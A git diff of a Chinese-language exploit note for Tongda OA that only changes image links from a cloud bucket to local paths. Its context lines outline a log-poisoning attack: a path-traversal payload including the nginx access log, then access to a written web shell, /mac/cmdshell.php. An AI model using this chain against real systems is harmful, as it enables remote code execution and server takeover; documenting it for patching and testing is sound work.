@@ -20,7 +20,7 @@ app="TDXK-通达OA"
 
 登陆页面
 
-![image-20220520154525896](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201545994.png)
+![image-20220520154525896](./images/202205201545994.png)
 
 发送恶意请求让日志被记录
 
@@ -31,7 +31,7 @@ User-Agent: Go-http-client/1.1
 Accept-Encoding: gzip
 ```
 
-![image-20220520154539264](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201545324.png)
+![image-20220520154539264](./images/202205201545324.png)
 
 在通过漏洞包含日志文件
 
@@ -46,7 +46,7 @@ Accept-Encoding: gzip
 json={"url":"/general/../../nginx/logs/oa.access.log"}
 ```
 
-![image-20220520154553517](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201545558.png)
+![image-20220520154553517](./images/202205201545558.png)
 
 再次发送恶意请求写入文件
 
@@ -61,8 +61,8 @@ Accept-Encoding: gzip
 json={"url":"/general/../../nginx/logs/oa.access.log"}
 ```
 
-![image-20220520154607791](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201546852.png)
+![image-20220520154607791](./images/202205201546852.png)
 
 访问写入的文件 `/mac/cmdshell.php`
 
-![image-20220520154623095](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201546179.png)
+![image-20220520154623095](./images/202205201546179.png)
